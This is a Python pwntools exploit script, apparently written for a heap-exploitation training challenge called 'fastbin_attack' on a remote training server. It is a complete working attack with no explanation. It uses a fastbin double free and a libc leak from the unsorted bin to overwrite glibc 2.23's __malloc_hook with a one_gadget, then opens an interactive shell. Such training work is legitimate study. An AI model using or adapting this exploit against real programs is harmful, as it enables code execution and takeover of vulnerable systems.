#! /usr/bin/python3
import pwn
import sys

def alloc(size):
    r.recvuntil("> ")
    r.sendline("1")
    r.recv()
    r.sendline(str(size))

def write(payload, index):
    r.recvuntil("> ")
    r.sendline("2")
    r.recv()
    r.sendline(str(index))
    r.recv()
    r.send(payload)

def read(index):
    r.recvuntil("> ")
    r.sendline("3")
    r.recv()
    r.sendline(str(index))
    out = r.recvuntil("\n")
    pwn.log.debug(out)
    return out

def free(index):
    r.recvuntil("> ")
    r.sendline("4")
    r.recv()
    r.sendline(str(index))


malloc_hook_offset= pwn.ELF("./libc-2.23.so").sym["__malloc_hook"]
print(hex(malloc_hook_offset))

pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
args = sys.argv
if "remote" not in args:
    r = pwn.process("./fastbin_attack")
    pwn.context.log_level = "DEBUG"
    pwn.context.arch = "amd64"
    if "gdb" in args:
        print("debug")
        gdb = pwn.gdb.attach(r, '''
        ''')
else:
    r = pwn.remote("bin.training.offdef.it", 10101)


alloc(0x60)  #index 0
alloc(0x60)  #index 1
#a scrivere scrive, il problema è dove cazzo lo trovo il malloc_hook?
free(1)
free(0)
free(1)
alloc(0x60)  #index 2
#free(0)
alloc(0xb0) #index 3
alloc(0xb0) #index 4
free(3)
offset_libc=0x3C4B78
address = read(3)
address = address[0:6]
if len(address)==6:
    address += b'\x00\x00'
if len(address)==7:
    address += b'\x00'
if len(address)==5:
    address += b'\x00\x00\x00'
address = pwn.packing.u64(address) #leak from unsorted bins
libc = address-offset_libc
malloc_hook=libc +malloc_hook_offset
write_address = malloc_hook-0x23
write_address = pwn.packing.p64(write_address)
pwn.log.debug(write_address.hex())
write(write_address, 2)
alloc(0x60) #index 5
alloc(0x60) #index 6
alloc(0x60) #index 7
one_gadget=libc+0xf1247
write(b'abcdefghijklmnopqrs'+pwn.packing.p64(one_gadget),7)
alloc(0x34)
r.interactive()
